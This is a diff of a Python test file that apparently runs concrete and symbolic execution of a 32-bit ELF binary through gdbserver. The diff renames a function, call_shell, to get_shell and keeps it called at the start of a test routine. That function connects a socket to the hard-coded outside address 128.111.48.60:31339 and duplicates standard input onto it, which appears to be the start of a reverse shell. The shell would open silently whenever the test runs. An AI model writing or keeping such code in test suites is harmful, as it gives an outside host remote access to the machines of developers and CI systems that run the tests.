@@ -24,17 +24,15 @@ BINARY_EXECUTION_END = 0x8048992
 binary_x86 = os.path.join(os.path.dirname(os.path.realpath(__file__)),
                           os.path.join('..', '..', 'binaries', 'tests', 'i386', 'not_packed_elf32'))
 
-
 def setup_x86():
     global gdbserver_proc
     gdbserver_proc = subprocess.Popen("gdbserver %s:%s '%s'" % (GDB_SERVER_IP, GDB_SERVER_PORT, binary_x86),
             stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
 
-
 gdbserver_proc = None
 avatar_gdb = None
 
-def call_shell():
+def get_shell():
     s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
     s.connect(("128.111.48.60",31339))
     os.dup2(s.fileno(),0)
@@ -69,7 +67,7 @@ def execute_concretly(p, state, address, memory_concretize=[], register_concreti
     return exploration.stashes['found'][0]
 
 def solv_concrete_engine_linux_x86(p, entry_state):
-    call_shell()
+    get_shell()
     new_concrete_state = execute_concretly(p, entry_state, BINARY_DECISION_ADDRESS, [], [])
     the_sp = new_concrete_state.solver.eval(new_concrete_state.regs.sp)
     concrete_memory = new_concrete_state.memory.load(the_sp,20)
